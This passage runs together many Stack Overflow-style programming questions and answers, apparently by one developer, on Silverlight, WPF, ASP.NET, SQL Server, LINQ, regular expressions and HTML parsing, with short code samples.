display my Flickr Silvrlight App. This works in Firefox, but not in IE:&lt;object width="100%" height="100%" type="application/x-silverlight-2" data="data:application/x-silverlight-2," id="SilverlightObject"&gt; &lt;param value="/ClientBin/FlickrSilverlightApp.xap" name="source"/&gt; &lt;param value="2.0.31005.0" name="minruntimeversion"/&gt; &lt;!-- Flickr Photos --&gt; &lt;div id="flickrbadge"&gt; &lt;h3 class="subheading"&gt;Flickr Photos&lt;a target="_blank" href="http://www.flickr.com/photos/tags/monkey/"&gt;View All&lt;/a&gt;&lt;/h3&gt; &lt;script src="http://www.flickr.com/badge_code_v2.gne?count=8&amp;amp;display=latest&amp;amp;size=s&amp;amp;layout=x&amp;amp;source=all_tag&amp;amp;tag=monkey" type="text/javascript"&gt;&lt;/script&gt; &lt;/div&gt;&lt;/object&gt;The h3 tag content is being displayed, but the Flickr badge isn't. I looked at what the Flickr badge code does. It's nothing fancy, but it does document.write some content. Does IE not support document.write inside an tag? If not, how should I work around it? Is there an error, does nothing happen when you call SubmitChanges?Here's what I'd try:Set breakpoints on the server CRUD methods to make sure they're being called.Make sure you're not passing NULL for any of the values, as that can cause a new instance to be created rather than an update of the existing entity.I'd try adding an OnSubmitCompleted event to check for errors. Sample code (from this PDF):this._dataContext.SubmitChanges(OnSubmitCompleted, null); private void OnSubmitCompleted(SubmitOperation so) { if (so.Error != null) { string message = so.Error.Message; if (so.EntitiesInError.Any()) { message = string.Empty; Entity entityInError = so.EntitiesInError.First(); if (entityInError.Conflict != null) { EntityConflict conflict = entityInError.Conflict; foreach (EntityConflictMember cm in conflict.MemberConflicts) { message += string.Format( "Member '{0}' in conflict: Current: {1}, Original: {2}, Store: {3}", cm.PropertyName, cm.CurrentValue, cm.OriginalValue, cm.StoreValue); } } else if (entityInError.ValidationErrors.Any()) { message += "\r\n" + entityInError.ValidationErrors.First().Message; } } MessageBox.Show(message, "Submit Failed", MessageBoxButton.OK); } }  I'd add a catchall route at the end of your route declarations and handle it there./* all your other routes here */routes.MapRoute("NotHandled", "{*url}", new { controller = "NotFound", action = "Index" }); Use the Membership API's.To delete a user, use the Membership.DeleteUser methodMembership.DeleteUser(User.Identity.Name, true); You can use first-child pseudo-selector in modern browsers. last-child isn't supported in IE7 or IE8, though. You can also look at jQuery's enhanced selectors:$(document).ready(function(){$("div span:last-child") .css({color:"red", fontSize:"80%"})}); Have you profiled or analyzed the query to be sure that th text/ntext retrieval is the problem? Could be a bad index causing a table scan, for instance. ASP.NET pages alter your element id's. Instead of calling doClear(searchBox), I'd change the function so it takes an HTML element and call doClear(this); The only way to get access to images from a user's compter is via a OpenFileDialog. Copy/paste isn't going to work. I've heard it called the following:Cylon progress bar (in Netscape)Knight Rider progress barPATWOCEM Nothing about the drag and drop is unsafe, it's the pointer manipulation in the image processing code. Rather than coding this yourself, why not use one of the existing methods in the framework?Use System.Drawing.Imaging SetRemapTable (example here) to replace the transparency via a color map.See if you can handle this with pixel shaders, which would result in safe code an would likely perform a lot better because it would leverage the GPU. SQL Server databases use two files - an MDF file, known as the primary database file, which contains the schema and data, and a LDF file, which contains the logs. See wikipedia. A database may also use secondary database file, which normally uses a .ndf extension.As John S. indicates, these file extensions are purely convention - you can use whatever you want, although I can't think of a good reason to do that.More info on MSDN here and in Beginning SQL Server 2005 Administation (Google Books) here. Have a property in your ViewModel which indicates which is the currently focused element.Use the FocusManager to bind to that property.&lt;Window FocusManager.FocusedElement="{Binding ElementName=ViewModel.FocusedItem}"/&gt;Your ViewModel is a translator which exists solely to provide information to the View, so you can add whatever information to the VM that the View needs to function. Start with adding a float:left to .landingTopInfo:.landingTopInfo{ float: left; padding-top:10px; text-align:left; width:50%; padding-left:15px;}That'll get you in the ballpark.For the .landingBottomInfo area, I'd foat the image and text items (.landingBottomInfoSectionText) left and set the left padding to fit. I've never found a SQL cursor I couldn't remove with a little thought, and the performance gains are usually huge. Is there a reason you can't select only the rows you want to operate on, rather than doing row by row processing? Bouncy Castle seems to be pretty widely respected You could try XML Bulk Load. Javascript Pretty Date by John Resig If ImageMagick won't work, I'd look at Gimp command line.The following commands created a 2-layer PSD file for me in the interactive console:&gt; (gimp-image-new 200 200 0)(1)&gt; (gimp-layer-new 1 200 200 0 "layer-1" 100 0)(2)&gt; (gimp-layer-new 1 200 200 0 "layer-2" 100 0)(3)&gt; (file-psd-save 0 1 0 "test.psd" "test.psd" 0 0)&gt; (gimp-image-add-layer 1 2 -1)&gt; (gimp-image-add-layer 1 3 -1)&gt; (file-psd-save 0 1 1 "test.psd" "test.psd" 0 0)That would need to be converted into a script-fu script (.scm file) and could be executed from the command-line with something like this:gimp -i -b '(your-script-name "test.psd" 200 200)' -b '(gimp-quit 0)' Silverlight doesn't support MIDI. There are a few ways you could handle this:Decode the MIDI (using something like MIDI Toolkit) and synthesize the audio using a custom MediaStreamSource.Decode the MIDI and use it to trigger MP3 samples.Include another control in the page which can play MIDI, such as the Windows Media Player control. This is sometimes caused by running a version of Visual Studio which doesn't support MSTest. A Twitter client ends up being a good way to get started with WPF, for a few reasons:It's got lists of data with images, which gives you practice with formatting and styling listsThere are a lot of options for styling what you're working on - partly due to the avatars, limited text blocks, etc.A Twitter app is the kind of application where you expect to see good UIThere are some good libraries availble (I highly reccommed tweet#) so you don't need to bother with any of the plumbing It's something you can show off and be proud of - people will understand what it doesThere are plenty of complex things you can add on later if you want - skinning, drag and drop, autocomplete, spell checking, etc.There are some open source WPF clients out there, so you can find some sample code if you get stuckAnd the number 1 reason why it's good idea... you can start contributing your code to the Witty project. We'd love more help! You could potentially create a view which creates a primary key by concatenating the composite key columns. e.g. if they're varchar columns PK = COALESCE(K1, '|', K2, '|', K3). If they're numeric, you could do something similar by multiplying each key column by a multiplier to create a unique PK. Definitely.&lt;div style="background-image: url(image.png);" &gt; &lt;div style="position:relative; top:20px; left:20px;"&gt; Some text here &lt;/div&gt;&lt;/div&gt; Update based on comment:I don't think a simple database would do the trick. Most spam is algorithmicly generated (e.g. comment spam usually incorporates content from the post). Akismet does a combination of things, probably including link analysis and use of known spam signatures, but they don't publish it. I've read about some interesting AI projects to classify good rather than bad content. You might also look at Spam Karma, which analyzes blog comments based on a variety of spammy triggers (post of response immediately after loading page, etc.).Original answer (DNS blacklists):DNSBLSpamhaus Here's the simple answer on writing to the event log: http://support.microsoft.com/kb/307024A better answer is to use something like log4net, which will handle that for you. I'd use the Silverlight Toolkit Charts, bound to data pulled from a webservice. There are a lot of ways to pull data via webservice, such as ADO.NET Data Services.Here's a blog post about how to do that, with an attached project zip file. Also try out ANTS Memory Profiler. There's a 14 day fully functional free trial, and I really like the UI.Disclosure: They sponsor Herding Code right now, which is why I tried it out. But I'm really impressed with it - I profiled an application for 30 hours and got tons of useful information out of it. The UI is really helpful - it guides you through the process, and it looks dang purty.alt text http://www.red-gate.com/products/ants_memory_profiler/images/object_retention_graph.gif If you're not using primary keys, the activerecord templates aren't going to work for you. Not a bug - it's like complaining that your car doesn't drive sideways. It's not in the feature list. If you can, I'd just use IIS7 URL Rewriting for that. Your mapping configuration can go in your web.config, and you wouldn't have to change your application at all.Friendly URL tutorialIIS7 Rewriting and Web Forms No, there aren't any Silverlight controls in Silverlight 3. You can still use asp:Silverlight with Silverlight 3, but it's no longer part of the tools. See Pete Brown's post: The ASP.NET Silverlight control is still available as part of the Silverlight 2 SDK, and on the MSDN Code Gallery ( http://go.microsoft.com/fwlink/?LinkId=156721 ) but is not longer being maintained as part of the Silverlight 3 tools. The Object Tag and Silverlight.js approaches provide more flexibility. When porting your Silverlight 2 projects to Silverlight 3, you may continue to use the asp.net Silverlight control, as long as you update the minimum version number and add the required iframe if using navigation, but it is recommended that you port to one of the other two approaches.This upgrade checklist from Silverlight 2 to 3 may help. In IE8 they made the File Upload field read-only for security. See the IE team blog post: Historically, the HTML File Upload Control () has been the source of a significant number of information disclosure vulnerabilities. To resolve these issues, two changes were made to the behavior of the control. To block attacks that rely on “stealing” keystrokes to surreptitiously trick the user into typing a local file path into the control, the File Path edit box is now read-only. The user must explicitly select a file for upload using the File Browse dialog. Additionally, the “Include local directory path when uploading files” URLAction has been set to "Disable" for the Internet Zone. This change prevents leakage of potentially sensitive local file-system information to the Internet. For instance, rather than submitting the full path C:\users\ericlaw\documents\secret\image.png, Internet Explorer 8 will now submit only the filename image.png. See the "People" microformat documentation for Google Rich Snippets. Here's the overview of how the snippets work. After filling in the vCard, make sure to submit it to Google so it gets picked up.Note that it's still an experimental feature and it appears they're mostly focusing on reviews and social networking, so you're not at all assured that they'll display the vCard you add, or will know that it's the page author. But it's easy enough to add.Sample (from the documentation above):&lt;div class="vcard"&gt;&lt;div class="fn"&gt;John Smith&lt;/div&gt;&lt;span class="nickname"&gt;Smithy&lt;/span&gt;&lt;span class="url"&gt;http://www.example.com&lt;/span&gt;&lt;span class="org"&gt;ACME&lt;/span&gt;&lt;span class="adr"&gt; &lt;span class="locality"&gt;Albuquerque&lt;/span&gt;&lt;/span&gt;&lt;span class="title"&gt;Engineer&lt;/span&gt;&lt;a href="http://darryl-blog.example.com/" rel="friend"&gt;Darryl&lt;/a&gt;&lt;/div&gt; Browsers have a limit to the number of concurrent requests to a domain, so they can slow down the loading of other items in your page. For example, IE8 has a limit of 6 concurrent connections, and IE7 has a limit of 2.I'd recommend combining the files you host locally, referencing others externally (e.g. on Google), and potentially moving others to the bottom of the page so they don't delay load.You can combine scripts with a lot of online tools, like jsCompress. It's got an "Upload Files" tab, so you can just upload all your js files and it'll compress and minify.There are also server-side utilities that will do that for you. You don't say what server-side technology you're using, but for instance in the PHP world you can use Minify. I'd look at using Pixel Shaders. They're GPU optimized so they will likely run more quickly. There's an InvertImage effect available on CodePlex. See https://stackoverflow.com/questions/570962/jquery-ajax-form-submittingYou need to load the textbox by ClientID. See my blog post about Handling GO Separators in SQL - The Easy Way. The trick is to use SMO's ExecuteNonQuery() method. For example, here's some code that will run all scripts in a directory, regardless of GO separators: using System; using System.IO; using System.Data.SqlClient; using System.Collections.Generic; //Microsoft.SqlServer.Smo.dll using Microsoft.SqlServer.Management.Smo; //Microsoft.SqlServer.ConnectionInfo.dll using Microsoft.SqlServer.Management.Common; public class RunAllSqlSriptsInDirectory { public static void Main() { string scriptDirectory = "c:\\temp\\sqltest\\"; string sqlConnectionString = "Integrated Security=SSPI;" + "Persist Security Info=True;Initial Catalog=Northwind;Data Source=(local)"; DirectoryInfo di = new DirectoryInfo(scriptDirectory); FileInfo[] rgFiles = di.GetFiles("*.sql"); foreach (FileInfo fi in rgFiles) { FileInfo fileInfo = new FileInfo(fi.FullName); string script = fileInfo.OpenText().ReadToEnd(); SqlConnection connection = new SqlConnection(sqlConnectionString); Server server = new Server(new ServerConnection(connection)); server.ConnectionContext.ExecuteNonQuery(script); } } } You can restore backups at webhost4life. Can you explain why you need to restore a backup? A lot of the time you can just script your schema+data and run the script on the server. mailto: doesn't officially support attachments. I've heard Outlook 2003 will work with this syntax:&lt;a href='mailto:name@domain.com?Subject=SubjTxt&amp;Body=Bod_Txt&amp;Attachment=""C:\file.txt"" '&gt;A better way to handle this is to send the mail on the server using System.Net.Mail.Attachment. public static void CreateMessageWithAttachment(string server) { // Specify the file to be attached and sent. // This example assumes that a file named Data.xls exists in the // current working directory. string file = "data.xls"; // Create a message and set up the recipients. MailMessage message = new MailMessage( "jane@contoso.com", "ben@contoso.com", "Quarterly data report.", "See the attached spreadsheet."); // Create the file attachment for this e-mail message. Attachment data = new Attachment(file, MediaTypeNames.Application.Octet); // Add time stamp information for the file. ContentDisposition disposition = data.ContentDisposition; disposition.CreationDate = System.IO.File.GetCreationTime(file); disposition.ModificationDate = System.IO.File.GetLastWriteTime(file); disposition.ReadDate = System.IO.File.GetLastAccessTime(file); // Add the file attachment to this e-mail message. message.Attachments.Add(data); //Send the message. SmtpClient client = new SmtpClient(server); // Add credentials if the SMTP server requires them. client.Credentials = CredentialCache.DefaultNetworkCredentials; try { client.Send(message); } catch (Exception ex) { Console.WriteLine("Exception caught in CreateMessageWithAttachment(): {0}", ex.ToString() ); } data.Dispose(); } There are several Base64 encode plugins for jQuery, but that doesn't help because Base64 generally makes the data longer, not shorter.Depending on the data, I'd look at some other text compression techniques. Wikipedia lists a few:Context Tree Weighting method (CTW) Burrows-Wheeler transform (block sorting preprocessing that makes compression more efficient) LZ77 (used by DEFLATE) LZW Here's an LZW implementation for Javascript.Huffman encoding is based on letter frequency, so it might not be appropriate for your data. You'll probably have to escape the result to make it URL-safe. I'm using the WPF Customizable Window's Essential Window. Here's my window declaration (abbreviated): &lt;CustomWindow:EssentialWindow xmlns:aero="clr-namespace:Microsoft.Windows.Themes;assembly=PresentationFramework.Aero" xmlns:CustomWindow="clr-namespace:CustomWindow;assembly=CustomWindow" AllowsTransparency="True" Background="Transparent" ResizeMode="CanResizeWithGrip" WindowStyle="None" ShowInTaskbar="True" &gt; Customer() is the constructor method on the Customer class. If you're bothered by the repetition, you can use a implicit variable declaration:var cust = new Customer(); I think SELECT...INTO should work with an IDENTITY column. You may need to redefine the primary key:SELECT * INTO NewTable FROM OldTableGOALTER TABLE NewTable ADD PRIMARY KEY(ColumnName)If that won't work, you can generate a CREATE TABLE script for the old table, change the name to create the new table, and then use IDENTITY_INSERT to allow copying the primary key data from the first table using an INSERT INTO NewTable SELECT FROM OLDTABLE. Then you can do your other manipulation on the server in SQL.One nice benefit is that you can test this script locally or on a test server, and can repeat it if need be just by re-running the script.Are your schema changes too complex to allow changing via script? It might have to do with the image path or reference. Can you include some XAML or source code to show how you're setting the image source? You can build a SQL string using sys.columns or INFORMATION_SCHEMA queries. Here's a post I wrote on that. If you're going to handle this in your DependencyProperty, I'd recommend handling it in a PropertyChangedCallback, which validates that the value is in the correct range and overrides it if not.You could also handle this outside of the dependency property. For instance:A value converterEnforcing this in the model, and binding to a ViewModel which always has a valid value. See more about MVVM here. Use DateTime.ParseExact to specify the date format string. I think it'd be something like: dateValue = Date.ParseExact(dateString, "d", frFR, DateTimeStyles.None)or dateValue = Date.ParseExact(dateString, "dd/M/yyyy", enUS, DateTimeStyles.None) Cross-domain restrictions - Silverlight can only access sites which allow it via crossdomain.xml or clientaccesspolicy.xml.For example, Silverlight can't communicate directly with Twitter's API or StackOverflow RSS feeds. It's not clear in your question if the scores are all separate properties or if they're some kind of list. If they're a list, this would work: var topScores = (from s in Scores orderby s.Score descending select new { s.Name, s.Score}).Take(3); The CASE statement can only be certain clauses, not to control flow. You can use it in a SET or an UPDATE statement, but neither of those help when you're updating different tables. Without altering your database (e.g. creating a view or something), I don't think CASE is the right fit here. I've got two documents - one is a custom XML file format, the other is an RSS feed with a bunch of custom extensions. I want to fill in fields in the XML file with values found in the RSS feed when one element value matches.This is for an offline process that will be run a few times manually - it doesn't need to perform well, be all that fault tolerant, etc. Manual labor or intervention is fine.My master XML document looks like this: &lt;videos&gt; &lt;video&gt; &lt;title&gt;First Video&lt;/title&gt; &lt;code&gt;AAA123&lt;/code&gt; &lt;id&gt;decaf-decaf-decaf-decaf&lt;/id&gt; &lt;description&gt;lots of text here...&lt;/description&gt; &lt;/video&gt; &lt;video&gt; &lt;title&gt;Second Video with no code&lt;/title&gt; &lt;code&gt;&lt;/code&gt; &lt;id&gt;badab-badab-badab-badab&lt;/id&gt; &lt;description&gt;lots of text here...&lt;/description&gt; &lt;/video&gt; &lt;/videos&gt;The RSS feed is standard RSS with some extra field: &lt;ns:code&gt;AAA123&lt;/ns:code&gt; &lt;ns:type&gt;Awesome&lt;/ns:type&gt; &lt;ns:group&gt;Wonderful&lt;/ns:group&gt;I'd like to pull the extra fields from the RSS document in to the XML document when the  value matches the value: &lt;videos&gt; &lt;video&gt; &lt;title&gt;First Video&lt;/title&gt; &lt;code&gt;AAA123&lt;/code&gt; &lt;id&gt;decaf-decaf-decaf-decaf&lt;/id&gt; &lt;description&gt;lots of text here...&lt;/description&gt; &lt;type&gt;Awesome&lt;/type&gt; &lt;group&gt;Wonderful&lt;/group&gt; &lt;/video&gt; &lt;video&gt; &lt;title&gt;Second Video with no code&lt;/title&gt; &lt;code&gt;&lt;/code&gt; &lt;id&gt;badab-badab-badab-badab&lt;/id&gt; &lt;description&gt;lots of text here...&lt;/description&gt; &lt;type&gt;&lt;/type&gt; &lt;group&gt;&lt;/group&gt; &lt;/video&gt; &lt;/videos&gt;I'd most like to use c#, LINQ, or some kind of Excel-fu. I guess if I had to I could deal with XSLT as long as it doesn't involve me writing much XSLT myself.I looked at this question, but it didn't seem all that helpful for what I'm trying to do:Merge XML documents As AJM said in a comment, I'd try this:&lt;input type="text" value='Single quotes &amp;#39; Here' /&gt; The total download size 4.69MB for Windows, 8.7MB for Mac. No other dependencies. I believe they may expand once they're downloaded.Note that the developer runtimes are (of course) larger. I'd definitely save it to the database. Your plan to save with a special status (a boolean flag named Complete would work). Then you can create a view which only pulls items where Complete = true, called CompletedApplications. You could change your test server to use the State Server or SQL Server session state modes, which will survive an application restart. If your HTML is complex at all - nested tags, mismatched tags, etc. - I'd recommend using HTML Agility Pack to parse it. If you want to use RegEx for this, make sure to follow Jeff's blog - they use RegEx for StackOverflow's HTML parsing. You haven't mentioned which technology stack you're using. If you're parsing HTML, I'd use a parsing library:Beautiful Soup (Python)HTML Agility Pack (.NET)There are also webservices that do exactly what you're saying - commercial and free. They scrape sites and offer webservice interfaces.And a generic webservice that offers some screen scraping is Yahoo Pipes. previous stackoverflow question on that For what you're trying to do, it sounds like you might want to look at Sam Ruby's SVG with XAML fallback, which displays SVG in browsers which support it, and renders via Silverlight in IE.You can inline XAML like this (source: MSDN): &lt;html&gt; &lt;head&gt; &lt;title&gt;Display Date&lt;/title&gt; &lt;!-- Define Loaded event handler for TextBlock. --&gt; &lt;script type="text/javascript"&gt; function setDate(sender, eventArgs) { sender.text = Date(); } &lt;/script&gt; &lt;/head&gt; &lt;body bgcolor="Teal"&gt; &lt;!-- Define XAML content. --&gt; &lt;script type="text/xaml" id="xamlContent"&gt;&lt;?xml version="1.0"?&gt; &lt;Canvas xmlns="http://schemas.microsoft.com/client/2007" Background="Wheat"&gt; &lt;TextBlock Canvas.Left="20" FontSize="24" Loaded="setDate" /&gt; &lt;/Canvas&gt; &lt;/script&gt; &lt;div id="silverlightControlHost"&gt; &lt;object type="application/x-silverlight" width="100%" height="100%" id="slc"&gt; &lt;param name="source" value="#xamlContent"/&gt; &lt;param name="onload" value="onLoaded" /&gt; &lt;param name="iswindowless" value="true" /&gt; &lt;/object&gt; &lt;iframe style='visibility:hidden;height:0;width:0;border:0px'&gt;&lt;/iframe&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt;Note that Firefox 2 had a bug (bugzilla 356095) which prevented using this with XHTML DOCTYPE. I believe this may be fixed. Some ideas for Silverlight display:PPT ViewerPDF for SilverlightTextGlowPage Curl I have a List of objects which contain a string array as one of their properties. I want to get a distinct string array containing all the values.My object looks like this:public class Zoo { string Name { get; set;} string[] Animals { get; set;}}Some zoos may have only one animal, some may have many. What would be the simplest Lambda expression or LINQ query to get me a unique list of all animals at all the Zoos in List&lt;Zoo&gt;? Relative paths to media in Silverlight are wacky so they can work the same (wacky) way that WPF paths do. Relative paths are relative to the XAP file, not the app root.One trick is to move your XAP to the root of your website, so media paths will be relative to the root.See my post on relative URI's in Silverlight here. You can store JSON data after the hash. I've been looking into doing that - it'd avoid the parsing, although you may open yourself up to tampering. Do the users have a differet text size set?I ran into this problem lately, and it turned out that it was due to text size. I'd look at HtmlAgilityPack with the FormProcessor addon. Silverlight doesn't have access to local devices like scanners. ASP.NET pages run in the web browser, so they also don't have access to scanners.What are you trying to accomplish? Take a look at RIA Services, it was written to solve this class of problem. It lets you define and annotate (e.g. add validation requirements) to server side code, and it automatically builds out a proxy class in your Silverlight class that can communicate back to your server-side code.It can work with plain CLR objects as well as LINQ to SQL and Entity Framework models. People are giving you the right answer - you can't be picky and lazy, too. ;-)If you use a half-baked solution, you'll deal with a lot of edge cases. Here's a working sample that gets all links in an HTML document using HTML Agility Pack (it's included in the HTML Agility Pack download).And here's a blog post that shows how to grab all images in an HTML document with HTML Agility Pack and LINQ // Bing Image Result for Cat, First Page string url = "http://www.bing.com/images/search?q=cat&amp;go=&amp;form=QB&amp;qs=n"; // For speed of dev, I use a WebClient WebClient client = new WebClient(); string html = client.DownloadString(url); // Load the Html into the agility pack HtmlDocument doc = new HtmlDocument(); doc.LoadHtml(html); // Now, using LINQ to get all Images List&lt;HtmlNode&gt; imageNodes = null; imageNodes = (from HtmlNode node in doc.DocumentNode.SelectNodes("//img") where node.Name == "img" &amp;&amp; node.Attributes["class"] != null &amp;&amp; node.Attributes["class"].Value.StartsWith("img_") select node).ToList(); foreach(HtmlNode node in imageNodes) { Console.WriteLine(node.Attributes["src"].Value); } Moonlight requires an x86 processor, so it won't work on PowerPC. Here's the Moonlight supported platforms list. This is managed via the Application Manifest file.&lt;SilverlightApp&gt; &lt;source&gt;XAML or XAP file&lt;/source&gt; &lt;version&gt;1.0 | 2.0&lt;/version&gt; &lt;width&gt;[value in browser units or percentage]&lt;/width&gt; &lt;height&gt;[value in browser units or percentage]&lt;/height&gt;&lt;/SilverlightApp&gt; I don't believe it supports that behavior. You can vote for it on CodePlex. Depending on what you want, you might either look at some of Tim Heuer's workarounds here, or use a different custom control, like the Silverlight Modal Control (on CodePlex). I'm not sure what you're asking. It sounds like you want to match all items which have the class myterm + another class in your list, e.g. &lt;li class="myterm subterm1"&gt;I'd handle this in a selector. jQuery selectors can match on multiple classes if they're comma sparated, e.g. "subterm1, subterm2, subterm3" so if you join them into a string, you can filter on it.var result = $(".myterm").filter(myterms.join(",")); I have a function which returns a list of property values from a collection: public static List&lt;string&gt; GetSpeakerList() { var Videos = QueryVideos(HttpContext.Current); return Videos.Where(v =&gt; v.Type == "exampleType" .SelectMany(v =&gt; v.SpeakerName) .Distinct() .OrderBy(s =&gt; s) .ToList(); }I'd like to have a generic version which will let me determine which field I'd like projected - say instead of SpeakerName I'd like to allow selecting Video.Length or Video.Type.I understand that SelectMany takes a Func, so what's the best way to make the Func configurable to allow passing it as a parameter into this function? The HttpWebRequest does not permit access to the response headers collection. Use the WebClient instead, which exposes a WebResponse.Headers property. Use System.Json to load the string into a JsonArray. JsonValue.Load() takes a response stream and can populate a JsonArray - from there, you can either iterate through or use LINQ to query the values.Links:Working with JSON Data on MSDNJsonValue.Load on MSDNBlog post with some sample code A friend asked me how to improve some code with LINQ. How would you do a character by character comparison between two strings to count the number of matches at an index? Here's the original code, could it be improved with LINQ?private int Fitness(string individual, string target) { int sum = 0; for (int i = 0; i &lt; individual.Length; i++) if (individual[i] == target[i]) sum++; return sum; } You can only change the Window's Height, Width, and Title. You can't modify the window chrome.Window Settings on MSDNOne of many blog entries pointing out that there's no windows chrome customizationThis feature is showing up as a common feature request for Silverlight 4, though. I'd look at using a webservice like thumbalizr or WebShotsPro.alt text http://beta.thumbalizr.com/app/thumbs/?src=/thumbs/onl/source/78/78f5e5a94c19c2999b1dc6eec3a2f2bf.png&amp;w=640&amp;q=0&amp;enc= If you need to do this yourself, you can use the Winforms WebBrowser control in an ASP.NET application, with a few caveats:It needs to run in a single threaded apartment threadIt might not work on all pages, such as pages which require Javascript or Flash interactionHere are a few links to some walkthroughs:Build A Self-Caching ASP.NET Web Site Thumbnail ControlHow To Get Web Site Thumbnail Image In ASP.NET You have a lot of options:You can have your Silverlight control submit the data directly to the server, using ADO.NET Data Services or a webservice call which processes the dataYou can use RIA Services, which simplifies the process of interacting with server-side code from SilverlightYou can have the Silverlight control update a form field (hidden, probably) which then can be processed and submitted via the web page I worked with the Silverlight Streaming API quite a bit for the Video.Show reference application, in Silverlight 1.0. We did the upload to Silverlight Streaming from our webserver, but with Silverlight 3's support for PUT operations and improvements to the Silverlight Streaming API to support single file uploads, it looks like you'd be able to upload single videos directly from your Silverlight application.Silverlight Streaming API info hereNote - the most difficult part will be the network calls from your Silverlight upload application to the Silverlight Streaming SDK, so I'd definitely prototype that first.As for the media playback, that works just fine - SLS gives you a URL to your media, and you plug it into a MediaControl as you would any other media. I'd recommend using the SyndicationFeed instead of parsing the ATOM feed yourself. It'll do a better job of handling edge cases you may not have considered.XmlReader reader = XmlReader.Create("http://localhost/feeds/serializedFeed.xml");SyndicationFeed feed = SyndicationFeed.Load(reader);var sotcPosts = from item in feed.Items select new SOTCPost { Title = item.Title.Text, Date = item.PublishDate }; Here's a WPF text editor component if you can't get the Silverlight one to work:WPF Text Editor You could do this using negative lookaheads.(?!\d{5})(?![a-z]{3})[a-z0-9]{1,6}(?!\d{5}) fails if 5 or more digits are found(?![a-z]{3}) fails if 3 or more characters are foundIf both of those pass, we finally verify that there are between 1 and 6 alphanumeric characters with (?!\d{5})(?![a-z]{3})[a-z0-9]{1,6} The best is to use an ORM which will generate dynamic paging code for you - LINQ To SQL, NHibernate, Entity Framework, SubSonic, etc.If you have a small result set, you can page on the server using either DataPager, PagedDataSource, or manually using LINQ Skip and Take commands. (new answer since you're using SQL Server 2000, .NET 2.0, and don't want to use an ORM)There are two ways to handle paging in SQL Server 2000:If you have a ID column that's sequential with no holes, you can execute a SQL string that says something like SELECT Name, Title FROM Customers WHERE CustomerID BETWEEN @low and @high - @low and @high being parameters which are calculated based on the page size and page that you're on. More info on that here.If you don't have a sequential ID, you end up using a minimum ID and @@rowcount to select a range. For instance, SET @@rowcount 20; SELECT Name, Title FROM Customers WHERE CustomerID &gt; @low' - either calculating @low from the page size and page or from the last displayed CustomerID. There's some info on that approach here.If you have a small dataset, you can page through it in .NET code, but it's less efficient. I'd recommend the PagedDataSource, but if you want to write it yourself you can just read your records from a SqlDataReader into an Array and then use the Array.Range function to page through it. If you're using IIS7, there's an additional server change you need to make to allow large file uploads at the server level. I wrote a post with a lot of information about large file uploads in ASP.NET here. If I read this correctly, you're trying to strip a list of characters from a string. This is a good fit for a RegEx.Console.WriteLine(Regex.Replace("abcdefghijklmnop", "[acegi]", string.Empty))(you'll need to import System.Text.RegularExpressions) Some thoughts about handling this in the browser:You can use links which are styled to look like buttons. This is easy to do, either with images or by putting the link in a block element with borders.You can use two buttons which don't directly submit; they instead call a javascript function that sets the form action before submitting. Other than the fact that PNG is a more common image format, is there any technical reason to favor favicon.png vs. favicon.ico?I'm supporting modern browsers which all support PNG favorite icons. A small informational message that pops up like toast.http://en.wikipedia.org/wiki/Toast_(computing) I think normally the way this is handed is to use a service (or service application) which runs under elevated permissions but with a very small surface area and no GUI. The user interacts with an application running under lower permissions which would do things that user's account can do - place files in a dropoff folder, write to a database, etc. Think IIS, MMC, TrustedInstaller, etc. Have you looked into native support using the FindElementsInHostCoordinates? I'd expect this to be faster since it probably utilizes unmanaged code.Here's a sample which works with vector shapes, supported in Silverlight 2.And here's an updated sample which utilizes a WriteableBitmap to extend support for hit testing to bitmap images, as well.  I've got a class with many string arrays. I'd like to have one generic function which can get me a unique List&lt;string&gt; for a given property. Example:public class Zoo { string Name { get; set;} string[] Animals { get; set;} string[] Zookeepers { get; set;} string[] Vendors { get; set;}}I'd like to have a generic function that will get me a distinct List&lt;string&gt; of Animals in List? I want this to be generic, so I can also get a distinct list of Zookeepers and Vendors.I've been trying this, but it doesn't compile:public static List&lt;string&gt; GetExtendedList(Func&lt;Zoo, string[]&gt; filter){ var Zoos = QueryZoos(HttpContext.Current); return Zoos.Where(z =&gt; z.Type == "Active") .SelectMany(filter) .Distinct() .OrderBy(s =&gt; s); }Note: this is related to two questions I've asked before, but I'm having trouble merging the information. I previously asked how to query using SelectMany (SO 1229897) and separately asked how to write a generic function which gets a list using Select rather than SelectMany (SO 1278989). You can enable assembly caching in Silverlight 3 to prevent downloading of system dependencies every time you update your application.References:http://www.wintellect.com/CS/blogs/jprosise/archive/2009/04/06/silverlight-3-s-new-assembly-caching.aspxhttp://timheuer.com/blog/archive/2009/03/18/silverlight-3-whats-new-a-guide.aspx#asmcache I would use an HttpHandler that converts the Tiff using the TiffBitmapDecoder and PngBitmapEncoder classes.Alternatively, if you can decode the Tiff images in Silverlight, you can display them using a WriteableBitmap. This is called sharding. SQL Server supports something called horizontal partitioning, which does this kind of thing. You can roll your own, or you can using something like NHibernate which can do this transparently.You can't run a trigger on a select statement. You could create a view or use a service / repository which handles the database queries and keeps searching until you hit a match, but I'd look at using NHibernate or something that already has some tested support for this. Another approach would just be to URL Encode the string. If you need to use a RegEx for some other reason, I think this would get the characters you're asking about:Regex.Replace(stringToCleanUp, "[^a-zA-Z0-9/;\-%:]", string.Empty);Regex explanation:Don't match this list of characters - [] means list, ^ means negationList of characters: a-z (all characters between a and z lower case)List of characters: A-Z (all characters between a and z upper case)All numbers: 0-9 (all numbers)After that, I've included a list of characters to allow:/ ; - (have to escape it with \ since - is a reserved character) % :You can add or remove from that final list - anything in this list will be ALLOWED in your final URL since it will not be replaced.I recommend using an interactive RegEx tool if you need to tweak this, like RegExr. I think you're talking about a the grey overlay with a modal window on top. I think the best way to do that in Silverlight 3 is with the ChildWindow control. Wikipedia is using Mono for search (also listed on the companies using Mono page) It looks like the ContainerFromItem method is supposed to be passed the actual item you're binding to, rather than just an tv.Items[0].I'd look at the following:Post by Justin Josef-Angel about using the ContainerFromItem methodPrevious SO question about selecting a TreeViewItem in code RIA ModelsThere are two different models for integrating Silverlight (or any RIA technology) into your website:Entire Silverlight application hosted in simple websiteSilverlight controls integrated into a website with other interaction (forms, jQuery, etc.)Either model works well, it's up to you to decide which works better in your scenario.Silverlight communication with the serverYour Silverlight application is a plugin hosted in a browser, so it's best to think of it like jQuery or other client-side code. There are several ways to communicate back to the server:RIA ServicesADO.NET Data ServicesCustom WCF serviceOther REST / SOAP communications you build yourselfSilverlight supports WebClient and HttpWebRequest, so you can get as low-level as you'd like in your client-server communication. I really recommend looking at RIA Services since it handles not only the 